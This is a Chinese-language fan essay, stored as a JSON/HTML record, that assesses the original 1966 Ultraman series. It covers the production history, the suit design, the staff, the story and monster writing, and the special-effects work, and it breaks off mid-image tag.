[{"title":"如何评价《初代奥特曼》？","date":"2021-07-18 11:30:08","description":"\n<h2>一切的伊始 </h2>\n<p>奥特曼这个系列传到今天，已经有55年了。这个长寿的系列给了无数的孩子珍贵的童年回忆，无论是70后，80后，90后，00后，还是10后，提起奥特曼这个IP，心里总归会有或多或少的印象。而这个IP的伊始，就是1966年的这部作品：初代奥特曼。初代奥特曼作为第一步开山作，不仅仅是给后人指明了应该怎么拍摄这种作品，而且其本身拥有非常高的质量，无论是本篇的剧情水平，还是主角和敌役的塑造，亦或是其特摄部分展现出的特摄水平，在当时都是最上品的东西。可以说，即使没有后面的系列，初代奥特曼也是一部至真，至纯，至善，至美的作品，其制作时候的思路，是值得被后世所有奥系列的作品所吸纳的。</p>\n<h2>初代幕后的故事</h2>\n<p>初代虽然是一部完成度极高，作品剧集水平极高，同时特摄水平在当时世界顶级的作品。虽然他有这么高的地位以及水平，但是其实这部作品是一部准备时间非常短，并且一度濒临难产的作品。其制作条件是收到了极大的限制的，但正是因为如此，初代为何能够变成这样的一部极高水平的作品，其本质原因就是因为初代聚集了一批拥有极高的水平，同时又拥有相当热情的staff们。这些优秀的监督，脚本，特技监督，以及摄影等片场人员，碰撞出了许多十分有趣的故事。因此，初代曼的回答的第一个部分，我选择讲一下初代曼在制作时候的幕后的故事，也让读者们能够拥有更多的关于这部剧集的知识。 </p>\n<h3>难产 </h3>\n<p>1966年1月份，円谷制片厂的第一部特摄TV《奥特Q》在TBS播放了，当时就获得了轰动，收视率最高超过了30%。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-0a68f1839351d9fdc22546a8a61def36_720w.jpg?rss\" data-rawwidth=\"430\" data-rawheight=\"600\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-0a68f1839351d9fdc22546a8a61def36\" data-watermark-src=\"v2-e7461ce89b699b399113bce3045ba4fc\" data-private-watermark-src=\"v2-0e8afefa7d42b57de37d1e488773c2f3\"></p>\n<p>但是在这部作品播出之前，円谷制片厂就已经开始作接下来的企划的打算了，其本质原因是因为円谷为了发展，必须主动，因为円谷作为“小作坊”，在和TBS的合作中，必须要主动，而TBS方的制片人栫井巍向円谷制片厂下达了制作新作的要求，要求为以下几点：</p>\n<p>第一，要有类似于“防卫队”的组织出现，因为在奥特Q里，三个主要角色分别为一个飞行员，一个助手和一个女记者，这样的三个“闲散人员”参与与怪兽的斗争本身就不合理，这点已经在当时被无数的批评家说过了，因此，TBS方要求円谷的新作中要出现成建制的“防卫队”。</p>\n<p> 第二，要有一个真正的固定主角。《奥特Q》这部作品本身的重点其实并不是塑造人物，而是怪奇现象，并通过这种设计展示“世界的円谷”的极具震撼力的特摄技术，因此，所谓的“主角团”其实仅是引路人，但这种设计在子供向的作品中是行不通的，给孩子看的剧集一定要有一个固定的主角。</p>\n<p> 第三点就是要求円谷制造彩色的电视剧，这在现在看起来是理所应当的，但是我们需要注意的一点是，直到50年代末，日本的电影才普及彩色电影，电视剧作为电影的下位个体，其普及的时间自然是更晚的。事实是，当时的日本的黑白电视机都没有普及，就更别提更加昂贵的彩色电视机了，对于当时的円谷制片厂而言，本身奥特Q就给円谷留下了大量的财政赤字，而拍摄彩色电视剧的成本，要比拍摄黑白电视剧高得多。 从我上文的描述中，大家应该能体会到这个新企划对当时的円谷制片厂而言是多困难的一个企划，但是，已经得到的档期不能放弃，当时的总经理市川利明的想法大概是：</p>\n<p><img src=\"https://pic4.zhimg.com/v2-8a9632ba878d9f87c775a59c77f8fb79_720w.jpg?rss\" data-rawwidth=\"1080\" data-rawheight=\"2461\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-8a9632ba878d9f87c775a59c77f8fb79\" data-watermark-src=\"v2-6c6c720ec2255ac58d89d9575804bea1\" data-private-watermark-src=\"v2-0853e9f6d08bb14dd3a7a3bf9081ae27\"></p>\n<p>于是，他在接到了这样的要求以后，就开始制定企划。要求一开始就拿出一个全新的企划是不现实的。市川找了一圈，发现之前和富士电视台谈合作的时候，有个《彗星生物WoO》的废案，那得嘞，就是他了。于是，在把这个原来的企划进行了比较大的改动之后，市川就把这个企划交给了TBS的影视部。</p>\n<p>我们需要知道的是，TBS不可能接受一个被富士毙掉的废案，即使这个废案已经被改动得原来的废案大相径庭。身为经营者的市川更是十分了解这点。他这个行为，其实就相当于一个简单的投石问路，我先给你们一个东西，然后看一下，TBS方究竟有什么要求，哪些东西是可以的，哪些东西是不可以的，这招也确实起到了作用。市川大概知道了TBS的想法：他想要一个有超级英雄的特摄电视作品。试探出这个核心重点之后，市川开始召集脚本家们来进行企划。当时的円谷，有专门的企划室，因此，企划室长自然就承担起了进行企划的重担。这个企划室长是谁呢？</p>\n<p><img src=\"https://pic3.zhimg.com/v2-d3d1a9824ef9fbf6ab06263cc7a74824_720w.jpg?rss\" data-rawwidth=\"500\" data-rawheight=\"678\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-d3d1a9824ef9fbf6ab06263cc7a74824\" data-watermark-src=\"v2-b314d6dbaf4fa6d80935576a696c0a49\" data-private-watermark-src=\"v2-ef55f4fcabe68b48d8c3ccf7494c5ded\"></p>\n<p> 没错，就是大家都很熟悉的金城哲夫。</p>\n<p>说是企划室长，但其实，这个所谓的企划室，有且只有两个人。一个是金城，担任企划室长，而另一个就是被金城坑过来的同乡上原正三。这两个人当然是要承担企划的责任的，还有另一个人，就是在奥特Q中担任脚本的山田正弘。这三个人在几天的brainstorm之后，拿出了一个叫做“宇宙怪兽百慕拉”的企划。 </p>\n<p>提出这个企划之后，就是円谷社内的反复讨论修改了。最后，円谷向TBS提交了一个最初的企划：《科学特搜队 百慕拉》，这个企划的重点有两个：第一个，就是延续奥特Q的怪兽特摄路线，而第二个就是科学特搜队这个组织。而这部剧中的正面的主角，是一只叫做百慕拉的怪兽。</p>\n<p>百慕拉一开始的形象是这样的：</p>\n<p><img src=\"https://pic3.zhimg.com/v2-bd605a3fb3e12795c07ed8ff717478fb_720w.jpg?rss\" data-rawwidth=\"360\" data-rawheight=\"512\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-bd605a3fb3e12795c07ed8ff717478fb\" data-watermark-src=\"v2-c02bc9fa9b6011428d74ce375915f4bc\" data-private-watermark-src=\"v2-fd3ef697bb17bc080d83d09e860bc5a2\"></p>\n<p>这形象其实大家能看出来，借鉴了西游记里的狮驼国的那只金翅大鹏（迦楼罗）以及日本的天狗这种妖怪，一拿出来，金城一看表示，哎，整挺好，円谷社内也达成了压倒性的满意的意见，于是，金城就把这个形象拿过去给英二看。</p>\n<p>英二呢，盯着这个稿子看了半天，然后来了一句：“如果是彩色TV的话，那英雄有飒爽感是决胜负的关键啊”，特摄之神，没有人比他更懂特摄（字面含义）的人发话了，那自然就要去改一下了。</p>\n<p> 于是，金城就找到了我们的另一个老熟人：成田亨。在提出“飒爽感”的要求之后，结合百慕拉的怪兽的身份，成田亨给出了这个稿子： </p>\n<p><img src=\"https://pic2.zhimg.com/v2-4735bf0c6d8d4b9e15e6abe6fd06df96_720w.jpg?rss\" data-rawwidth=\"328\" data-rawheight=\"553\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-4735bf0c6d8d4b9e15e6abe6fd06df96\" data-watermark-src=\"v2-128280876dd53798a4e2c32348d3a2ca\" data-private-watermark-src=\"v2-044690601f52c81ccf840c43bd55c901\"></p>\n<p>这个怪兽身上呢，我们能看到一定的熟悉的元素，最明显的应该是肩部的肩甲，这个设计又被用在了后面奥特赛文的身上。后面，在金城转达的英二的“飒爽感”的要求下，把设计改成了这样</p>\n<p><img src=\"https://pic4.zhimg.com/v2-d6d8d83ee0814ff14668cd3d204c5c22_720w.jpg?rss\" data-rawwidth=\"309\" data-rawheight=\"551\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-d6d8d83ee0814ff14668cd3d204c5c22\" data-watermark-src=\"v2-3771b0e7345ff682494048bdf45dfcf1\" data-private-watermark-src=\"v2-c1d89a24779d6c222149f51441ced8c5\"></p>\n<p>其实这个稿子已经有点初代曼的既视感了，只是这个时候用的还是百慕拉的名字。</p>\n<p>在皮套设计的同时，企划的会议也在如火如荼地进行中。TBS呢，又召集円谷开了个企划相关地会议，会议上提出了这几点：</p>\n<p>第一，以怪兽作为主人公还是有点难以接受，这点是事实，因为当时的制作环境下，怪兽还是不太能当英雄的形象</p>\n<p> 第二，是这个企划的民俗感太强了，希望能有更多的科幻的感觉。</p>\n<p>第三，TBS提到了1965年上映的，本多猪四郎监督，円谷英二特技监督的《科学怪人对地底怪兽》作为参考。 </p>\n<p>既然TBS提出了要求，那円谷方就要改企划，但是这些要求，当时円谷表示没见过啊，跟之前提到过的TBS方的栫井巍交流，对方也语焉不详，最后，还是那个最懂特摄的人拍板：我们模仿老美的超人，搞一个我们的超级英雄。到这里，这个英雄的方向终于定下来了。 主角的方向定下来了，那就自然要去设计形象，于是，金城就带着新的要求，去找到了成田亨。</p>\n<h3> 关于皮套设计</h3>\n<p> 成田亨接到要求之后，给了一个这样的设计稿：</p>\n<p><img src=\"https://pic3.zhimg.com/v2-d39735607aadaf85329a7de016883a55_720w.jpg?rss\" data-rawwidth=\"550\" data-rawheight=\"994\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-d39735607aadaf85329a7de016883a55\" data-watermark-src=\"v2-9e5ff9cc4f1beb2d0b3e719536881771\" data-private-watermark-src=\"v2-70352bf16b14ec54cdc6ebeba7eabd40\"></p>\n<p>当时这个东西还是叫雷德曼，或者直译的话，红超人。当然这个名字应该很快就改名叫奥特曼了，但是当时还是叫红超人。这个皮套因为种种原因，没有得到通过。这个时候呢，成田亨也差不多想出了一套设计的理论，之前我在赛文的回答里讲过，这里再搬运一下：</p>\n<p>成田亨先生的设计理念，是扎根于古希腊著名哲学家柏拉图先生提出的“混沌”（chaos）与“秩序”（cosmos）这一理念。在设计怪兽的时候，由于要让观众，尤其是作为主要受众的儿童察觉到怪兽身上怪的特点，但又不能让儿童感觉不适。在阐述自己的设计理念时，成田亨说：“不要对孩子们说，我们之后的节目，要带大家看一些不健康，让人感到不舒适的东西，如此言行的人没有资格当大人。”基于这种说法，他给自己定下了几条规矩：</p>\n<p> 不能仅仅将动物巨大化，必须融入独创性</p>\n<p>拒绝三头六臂式的畸形化怪兽拒绝满目疮痍，血迹斑斑，让人感到不适的造型</p>\n<p>而为了奉行自己的理念同时又能让怪兽看上去足够“怪”，成田亨先生将抽象性和意外性加入了自己的怪兽的设计中。那么，对于和代表“混沌”的怪兽对立代表“秩序”的巨大英雄，就应该是简洁的，流畅的“美的巨人”。 基于这种想法，初代曼最后诞生了</p>\n<p><img src=\"https://pic2.zhimg.com/v2-f08381a151e11fd6cf4ce2616204534b_720w.jpg?rss\" data-rawwidth=\"1080\" data-rawheight=\"1633\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-f08381a151e11fd6cf4ce2616204534b\" data-watermark-src=\"v2-1e729f015b95f9749ff042fafc31761e\" data-private-watermark-src=\"v2-a470beb23ca2ad29fe6cdbd9b4d34f8b\"></p>\n<p> 我们可以看到，初代曼的身体的颜色，基本分为红银两色，在成田亨的设想中，红色是有机的颜色，代表生命，而银色是无机的颜色，所以其实这个也可以解决蛮多人的一个问题：奥特曼究竟有没有穿衣服？</p>\n<p>答案是：穿了，但没完全穿。红色和银色交织在一起，那不就是穿了又没完全穿嘛。</p>\n<p>同时，初代曼整体的身材偏瘦，或者说是苗条，这是为了符合”宇宙人“的质感。</p>\n<p>然后我们注意到这个脸部，这个脸部参考了两个东西：一个是佛像，另一个是古希腊的雕塑。成田亨认为，真正的强者在面对敌人的时候，脸上也是要带有一抹微笑的。就这样，我们的奥特曼，来了。</p>\n<p>等等，是不是有哪里不太对？彩色计时器呢？</p>\n<p>其实，初代曼的设计，从一开始就没有彩色计时器，成田亨构想的奥特曼，是完美的生物，但是円谷那边表示：不行啊，一定要限制特摄部分的时间，哪有那么多钱来烧，因为这个原因，最后就在初代曼的胸口上加上了那个标志性的东西。</p>\n<p>企划有了，皮套也有了，那就应该开始投入拍摄了，下面，就是这些staff们大显身手的时间了。</p>\n<h3>关于staff们 </h3>\n<p>皮套有了，企划有了，那接下来就要投入紧张刺激的拍片工作了。拍片的工作呢，是由円谷和TBS合力的。TBS方面自然要派出自己的演出家参与这个工作，TBS方的栫井想了一下，决定找之前在奥特Q里就担当过脚本的饭岛敏宏来拍第一块的剧集。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-4e6a3f831018b742cd4f284749e5b2ea_720w.jpg?rss\" data-rawwidth=\"1108\" data-rawheight=\"622\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-4e6a3f831018b742cd4f284749e5b2ea\" data-watermark-src=\"v2-62fd8050526472e8cb2388a260020126\" data-private-watermark-src=\"v2-9d05e85a181c1f6ff59e097f90a559a3\"></p>\n<p>这个时候，对初代曼比较熟悉的观众可能就会有问题了，初代的第一集《超人作战第一号》，不是円谷一担任监督的吗？这里，我说明一下这个事情。</p>\n<p>我们如果仔细的去看初代的剧集目录，会发现他又两个排序，一个是播出顺序，另一个是制作顺序，从播出顺序上，超人作战第一号自然是第一集，但是从制作顺序上，他其实是第五本，而制作顺序上的前三本，则是第二集《打击侵略者》，第四集《食虫草的秘密》，以及第三集《科特队出击》。制作顺序上排行前三的三本，都是由饭岛敏宏来负责的。 </p>\n<p>但是这事情呢，其实比较缺德，因为当时是处于一种连台本都没有的状态，也就是说这东西除了一个企划之外其他的基本为0，因此，栫井想了个更缺德的点子：自己不说，把锅甩给金城哲夫。</p>\n<p>金城和饭岛也是老相识了，奥特Q里的《2020的挑战》这一回就是金城和饭岛合作的作品。金城去给饭岛传达指令的时候，还带来了三个任务：</p>\n<p>1.第一块一共有三本，全部交给饭岛来拍，而一般情况下第一块有且只有两本</p>\n<p>2.拍摄使用一班制，而平时円谷的动真格的作品一律为二班制。 </p>\n<p>这两个要求再加上之前说的朦胧状态的剧集，大家可以理解为什么要让金城去传达指令了，大家应该也能想到，饭岛当时的那种震惊加震怒的状态。 </p>\n<p>但再怎么样，活儿上面交给你了，再咋样还是得干。既然没有脚本，那只能硬着头皮自己上了，于是饭岛又拿起了千束北男的笔名，写了《打击侵略者》的脚本，这一本不写不要紧，一写，写出了一个全系列塑造地最好地外星人：巴尔坦星人出来。</p>\n<p>在第一块除了饭岛敏宏这个监督之外，还有一个人也在奋力拼搏，这个人，就是高野宏一。</p>\n<p>高野宏一算是英二的亲传弟子了，在拍《打击侵略者》的时候，这人其实还只是特技摄影，当时的特技监督是另一个大牛的场彻。但是的场因为业务繁忙，他还挂着另一部《快兽布斯卡》的特技监督，所以实质上这一话的特技监督是高野宏一干的。这个人我愿称之为円谷诸葛亮，真真是鞠躬尽瘁死而后已。当时初代和巴尔坦的那个极其有魄力的空中战，就是高野宏一的杰作。 </p>\n<p>我们再说回饭岛敏宏，在接下了栫井的任务之后，饭岛就要去和円谷那边接洽，然后呢，市川利明就又给了他一个big fxxking surprise，确切的说，不是一个，是五个，而这五个里最致命的其实是以下两个：</p>\n<p>第一个是胶卷的要求。比较致命的是1.5倍容许量，就是说你最多使用片子所需胶卷长度的1.5倍，这基本就是不可能的任务，因为胶卷这玩意你拍出来了啥只有你洗出来以后才直到，而超过容许量就是浪费胶卷，就要写检讨（这也是传统艺能了）。</p>\n<p>第二，每集光学合成镜头小于等于3个，这个就更致命了，大家想一下这个事情，人和怪兽同时出现就是一个，科特队员的射线枪又是一个，光线又是一个，这就三个了，怎么想怎么是不可能的任务，这就导致饭岛后面只能去PUA光学摄影师中野稔，不过中野确实不负円谷之名，在艰苦的条件下完成了任务。 </p>\n<p>除了拍摄第一板块得饭岛敏宏和高野宏一之外，我还打算介绍另外两个staff：円谷一和金城哲夫。 </p>\n<p>先说金城吧，这人大家都熟悉，之前也频繁出场过了，作为企划室长（共两名成员），权力很大，但同时大家不要忘了，金城哲夫是一个非常优秀的脚本家，而且全篇金城经手的剧本，都充满了一种正气在，他在初代曼的脚本都是很正能量的，比如《小英雄》里对井手的纠结与成长的刻画，再比如《怪兽殿下》这个最能体现初代曼精髓的两回，也是金城的手笔。可以说，金城无论是对这个系列的企划，还是自己的本职工作脚本，都完成得十分称职并且优秀。 </p>\n<p>另一个值得一提的，就是本篇监督円谷一。从他的姓氏就能看出来，他是円谷英二老爷子的儿子，也是著名的快手监督。円谷一其实也是很有水平的创作者，可惜的是他的才能被他的父亲英二所掩盖。这个人在初代中只是监督中的一员，他的光辉，还要等到5年后的1971年，才能完全显出。 </p>\n<h2>剧集评价</h2>\n<p>讲完了部分重要的staff和制作初期的趣事，我们可以来关注剧集了，剧集的部分，因为本身初代就分为本篇和特摄两个部分，因此，我对剧集的分析，也会分为这两个部分。那么我们就从本篇先开始。 </p>\n<h3>本篇之一：有趣的故事</h3>\n<p>这是初代曼的魅力的最核心的的东西：有趣的故事。我们一定要知道的是，无论是多么深刻隐晦的隐喻，还是对宗教等意识形态的融合，抑或是某些监督对构图和画面的追求，都是建立在一个有趣的故事是的基础上的。故事好，这些东西才是有根本的东西，才能立得住，否则这些东西都只能被某些极端粉丝天天挂在嘴边念叨。 </p>\n<p>我们知道，平成年代的奥棚有个叫八木毅的大牛，他在拍摄以初代为模仿对象的麦克斯的时候，提炼出了六个点，分别用六个以s打头的英语单词描述：story, simple, S.F, strong, speed以及sense of wonder。 </p>\n<p>story，指整部作品以单元剧的形式进行，要求每个单元剧都要有一个精彩的故事，并且最大限度得体现出脚本家和监督的风格。</p>\n<p>Simple，指剧情要简洁明快，让观众有一种爽快的感觉。这里需要大家注意的是：simple不是easy，这里的simple我个人认为更多的是对剧情结构的要求。</p>\n<p>S.F，指science fiction，指作品要有一种科幻感，因为既然是科学空想特摄，那自然要有一种科幻感。这也是在和TBS开会之后，TBS方提出的重要要求之一。</p>\n<p>Strong，指剧中的英雄一定要是一个强大的英雄。</p>\n<p>Speed，指剧情发展要快速，通过快节奏的剧情让观众无法移开眼睛。</p>\n<p>Sense of wonder，指作品要有一种奇幻感，能够激发观众的好奇心。</p>\n<p>这六个S是八木在制作麦克斯的时候的想法，但是这六个S放在初代中也一样适用。</p>\n<p>初代的故事无疑是十分精彩的，无论是对外星人的想象，还是对怪兽的塑造，这些东西都组合在一起，成为了有趣的故事的组成部分。甚至可以说，初代的39个剧集，没有一个是无聊的剧集，这也是为什么我认为初代是可以作为所有这个类型的剧集的范本的原因。</p>\n<p>有趣的故事，这是一切的核心。 </p>\n<h3>本篇之二：敌役塑造 </h3>\n<p>第二个比较重要的东西，就是初代的敌役塑造。之前我在哥斯拉的回答里写到过，特摄的兴盛和怪兽是分不开的，因此，对怪兽的塑造，其实是构成初代曼的魅力的一个非常重要的方面。 </p>\n<p>我们一定要知道的是，怪兽是怪兽，但又不是怪兽。 </p>\n<blockquote>“战争”的起因是过度的经济活动，这种扭曲的过度经济活动以不受欢迎的方式出现，横冲直撞，这就是怪兽的概念，怪兽不是怪兽。 </blockquote>\n<p>这是饭岛对怪兽这个东西的想法，我认为是非常有道理的。 </p>\n<p>比如说，人类造发电厂，那就有内隆嘎出来吸食电力，大肆破坏；人类开发核工业，那就会有加勃拉出来吃铀；因为核试验而最终毁灭了自己的文明的巴尔坦星人更是直接被饭岛称为“我们文明的另一种未来”，这些东西都是构成怪兽以及宇宙人的魅力的重要组成部分，因为他们确实和我们人类息息相关，越是这样的塑造，越能给观众制造出恐惧感来。 </p>\n<p>但除此之外，我们淡化怪兽作为人类活动的产物的这一方面，单纯地看这些怪兽，其实也是非常有趣且真实的。 </p>\n<p>举个例子，《怪兽殿下》中的哥莫拉，在自己的尾巴被打断之后，面对初代的进攻，依旧会想到用尾巴来还击，这就是非常符合动物本能的塑造。 </p>\n<p>而巴尔坦星人就更不用说了，这种高科技利用克隆工业化生产生命的文明和地球文明之间的冲突，以及这种高科技文明的生物的塑造，包括对火星文化的有机融合，都是经典中的经典。</p>\n<p>其他怪兽，例如以俯察态度面对人类的达达，后世无脑铁憨憨干架王的鼻祖雷德王，都是初代中十分精彩的怪兽塑造。正是因为这种怪兽的塑造以及对怪兽的重视，才让初代有资格成为一部优秀的作品。</p>\n<p>这里插一句，说点别的，自从进入平成年代以来，奥系列对怪兽的塑造就越来越不上心了，这大概也是和日本特摄的衰败有直接联系的。但是，即使这样，近年来的一些作品对怪兽的塑造也是太不上心了，让人不禁痛心疾首啊。 </p>\n<h3>本篇之三：多元故事</h3>\n<p>要说这个话题呢，我这里得再引入一对监督+脚本的组合，实相寺昭雄和佐佐木守，这两位在初代中合作过不少作品，例如14话《珍珠贝防卫指令》，15话《恐怖的宇宙线》，这两集其实熟悉初代的观众已经反应过味来了，但是大部分人还没反应，那接下来《故乡是地球》，《怪兽墓场》，这些都是这两个人合作的作品。 </p>\n<p>大家有没有发现问题？这两个人的作品，和奥特曼想要表达的主流价值，其实是相悖的。</p>\n<p>奥特曼的主流价值，是人类是值得守护的，奥特曼是正义的，但是在这两个人的笔下，一切似乎都不是这个样子的。奥特曼的正义被画上了问号，人类是否值得守护也被画上了问号。 </p>\n<blockquote>“如此写作特摄剧的同时，我想的是宇宙人真的是地球的侵略者吗。确实有明确瞄准地球展开侵略的宇宙人，但不是也有很多宇宙人只是偶然地经历了一系列巧合与变故，所以才坠落到了地球之上。只是因为外形与说的语言和我们不同而与之战斗将其驱逐，这正是地球人的自私，反过来不也是侵略野心的原点吗。如果再加上欲望，便会成为战争的理由。过去日本侵略亚洲与太平洋地区的基础应该就在这里。现在隐藏在与侵略的宇宙人战斗的大义名分之下的，不正是我们在不知不觉中酝酿出的战争的气氛吗。这正是‘地球人是宇宙之敌’，而‘日本人是地球之敌’的趋势。” </blockquote>\n<p>这是佐佐木守在讲解自己关于“怪兽墓场”这一回的创作思路的想法，从中我们可以明显得看到他对奥特曼这个系列的主流价值观的叛逆与质疑</p>\n<blockquote>“曾经存在于明治初期知识分子之间的振兴东亚的理想，在昭和时期被充当东亚霸主这一实际利益所取代，尽管仍然打着解放被西方殖民者占领的东亚这一招牌，但是在具体实践中，昭和知识分子已经没有如同冈仓天心诗意地描述‘亚洲是一体’时的那种余裕了”。</blockquote>\n<p>在这里我们可以明显地看出佐佐木在用奥特曼传达自己地想法。而实相寺昭雄作为他的搭档，则是对奥特曼精神的更极端的质疑者。在他的手下，科特队是可以被变成搞笑人物的。这种离经叛道的东西，也被初代的拍板团队包容了。正是因为这种兼容并包的精神，才使初代拥有了各种类型各种风格的优秀的单元剧。</p>\n<h3>本篇之四：人物塑造</h3>\n<p>这点其实也不用我说得太多，大家可以去看初代对哪怕出场次数不多得科特队的科学家的塑造，都是非常用心得。我这里只简单提一下井手。 </p>\n<p>要提井手就必须提小英雄这一回，这一回短短的25分钟之内，把井手的纠结，退缩，以及被打醒之后的奋勇，描绘得淋漓尽致，这和金城的非常深厚的笔力是脱离不开的。而每个队员其实都有不亚于井手的塑造。 </p>\n<p>我尤其要讲的是对奥特曼的塑造，在这部电视剧中，真正的主角不是早田，而是奥特曼，是一个充满了神性的奥特曼。</p>\n<p>什么是神性？是像我们平时参拜的那种东西吗？</p>\n<p>我以为，初代曼的神性，不光有“敬”，更有“畏”，这两者缺一不可，一起构成了初代曼的神性。 </p>\n<p>初代曼当然是让人尊敬的，他把核弹运向宇宙，一次又一次地解决人类解决不了地问题，这当然是让人尊敬的形象。 </p>\n<p>但是，从另一方面来说，我们会发现，初代是很无情的存在。初代中由于人类活动而出现的怪兽不在少数，无论是从人类变身而来的贾米拉，还是无辜从天上落下来的史盖顿，或是因为人类的搬运而苏醒的本来人畜无害的哥莫拉，这些都是无辜收到人类行为影响的怪兽，可这些怪兽统统被初代所解决了。如果这些东西放在平成年代，或许会有不一样的结局，但是在初代手下，他们没有一个逃脱被除掉的命运。 </p>\n<p>这就是初代令人敬畏的地方了。即使他对这些怪兽抱有同情，也不会动摇他处理掉这些伤害了无辜者的生物的决心。他或许会在战斗结束后对部分怪兽致以同情，但他不会手软。这才是初代神性的另一方面：畏。 </p>\n<p>《新·奥特曼》的脚本庵野秀明在自己担任脚本的《巨神兵降临东京》这一短片中抛出过一个观点：</p>\n<p><img src=\"https://pic2.zhimg.com/v2-55b55baa4d553d7e871976204c09750d_720w.jpg?rss\" data-rawwidth=\"2095\" data-rawheight=\"901\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-55b55baa4d553d7e871976204c09750d\" data-watermark-src=\"v2-a69d122c856b6da2baad1bcbb692b408\" data-private-watermark-src=\"v2-53dd55f420a03672c89c37ef9a2d7062\"></p>\n<p>我想，这句话用在初代的身上，其实是非常合适的。人类对他的敬，仅仅是因为他选择站在人类这一边而已。 </p>\n<h3>特摄之一：模型与空战 </h3>\n<p>说到特摄部分，首先要提到的，就是円谷对模型的使用和操演。这里我放一段由高野宏一完成的初代和巴尔坦的空战。</p>\n<a href=\"https://www.zhihu.com/video/1399030086855680000\"></a><p>我们可以看到，首先在一个皮套演员完成的实拍起飞动作之后，就进入了模型的操演部分。首先是两个角色的追逐，中间插入一段皮套演员的拍摄，通过调整摄像机的角度，制造出奥特曼在飞的假象，再切换成模型之间的追逐，到了近身搏斗的方式，则是让皮套演员上场的。整个这一段内容称得上是一气呵成，无论是从模型操演，还是通过调整摄像机的角度来制造奥特曼和巴尔坦在飞行得感觉，都做的相当完美，这是非常有魄力的并且完全担得上壮绝的特摄场景。 </p>\n<p>再来看后面一段:</p>\n<a href=\"https://www.zhihu.com/video/1399030005884755968\"></a><p>在初代和巴尔坦的格斗之后，我们能看到追逐与被追逐的交替，巴尔坦在后方攻击初代，这一段的光学合成以及对模型的爆破，都是非常精彩的，最后以初代落地，回首一个斯派修姆光线结束战斗。整个这段空战恢弘，是非常有魄力的特摄场景。 </p>\n<p>说到底，初代曼的魅力，不光在于其本篇的优点，其特摄部分，也是当时世界顶级的制作。</p>\n<h3>特摄之二：光学合成</h3>\n<p>其实这个部分，我主要想讲的是斯派修姆光线的那点事情。</p>\n<p>首先看这个名字，斯派修姆，这个一听就知道是音译，如果意译的话大概是宇宙物质光线，反正这东西被设定成元素周期表133号元素，鉴于现在只发现了118种，所以人们现在肯定找不出这东西，但是鉴于还可能存在未知元素，所以也未必就没有，用在这个名字主要是为了满足一种科幻感。 </p>\n<p>然后讲一下，为什么这个东西是十字形的手势。当时设计这个光线的时候，其实是有两种选择的，第一种就是线形的光线，就是类似艾梅利姆光线的那种，还有一种就是宽幅的光线，就是现在我们看到的这种。円谷这边一开始，实际上的特技监督高野和挂牌的特技监督的场商量了一下，想法是从之间发出线形的光线。 </p>\n<p>但是这个想法被中野稔，也就是光学摄像给否了，他觉得这样和科特队的成员的射线就没区别了，必须是更石破天惊的那种光线，这个想法也得到了饭岛敏宏的认可，于是高野就说从整个手掌发出光线试试看，这个想法得到了大家的认可。 </p>\n<p>中野又表示发射的时候手掌不要动，否则会影响光学合成的效果和质量，于是在这两点要求的前提下，通过不断让古谷敏摆姿势最终确定了这个十字形的手势。 </p>\n<h3>特摄之三：关于“动作戏”</h3>\n<p>先讲一个事情：初代曼整部作品，是没有杀阵这个职位的，也就是说，没有专业的武术指导来指导皮套演员打架。</p>\n<p>那有的人可能就有疑问了，没有武术指导，那打得能好看吗？</p>\n<p>答案是：没人在乎打得好不好看。 我们把时间往回拨，拨到1954年，担任哥斯拉皮套演员的中岛春雄就这个问题问过円谷英二，英二的回答是：你想做什么动作就做什么动作。</p>\n<p>因为拍的是特摄电影，所以动作元素并不重要。但是放在奥特曼里，这个就有点行不通了，因为毕竟有个巨大人型生物在这边晃来晃去的，你让他完全不考虑格斗元素也不现实。</p>\n<p>但是问题在于，担任奥特曼的皮套演员的古谷敏，他不是动作戏出身的。这个时候，我们的高野桑就又站了出来：实在不行我来吧。</p>\n<p>于是，除了特技监督，特技摄影之外，我们的高野桑又开始兼任杀阵，指导古谷敏和其他的皮套演员的打架的场面。 </p>\n<p>但是，我们一定要知道的是，高野桑的本职工作，是特技监督，他设计动作的一个非常核心的要点就是：动作要能为体现特殊技术做辅助。也就是说，动作只是为了让特摄场面更有观赏性的辅助元素。</p>\n<p>所以呢，可以说在奥系列里，不能体现特摄技巧的格斗场面，其本身的价值是非常有限的，所以现在部分人动辄“打戏分析”，动辄“打戏好”，倒也不是说不行，但总归有点舍本逐末了。 </p>\n<h2>来了，我们的奥特曼</h2>\n<p> 1966年4月1日，是奥特曼第一次出现在大众媒体的日子，可是这天的情况却并不顺利。穿上皮套，戴上面具的古谷敏根本什么都看不见，只能被人牵着走来走去，饭岛，高野这些负责第一块的工作人员都面面相觑，心想这还怎么得了，还是的场彻见过世面，急中生智在面具上开了两个窥孔，这才让古谷摆脱了零视野的状态。 </p>\n<p>就在这种混乱的时刻，円谷英二来了，他抬头看着古谷敏（因为古谷敏太高了），一边拍了拍他的肩膀，一边问：奥特曼，怎么样？痛不痛苦，能看见吗？能听得见吗？ 老爷子还说了点别的东西，只是因为太热了，皮套又有隔音效果，导致古谷敏没听清他说了什么，多年以后才知道老爹说的是“梦想啊，要给小孩子梦想”。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-653434a222bb71d07a5656e472569a09_720w.jpg?rss\" data-rawwidth=\"674\" data-rawheight=\"1008\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-653434a222bb71d07a5656e472569a09\" data-watermark-src=\"v2-fb391b6388ca806e7ff86bd23fa7d6f5\" 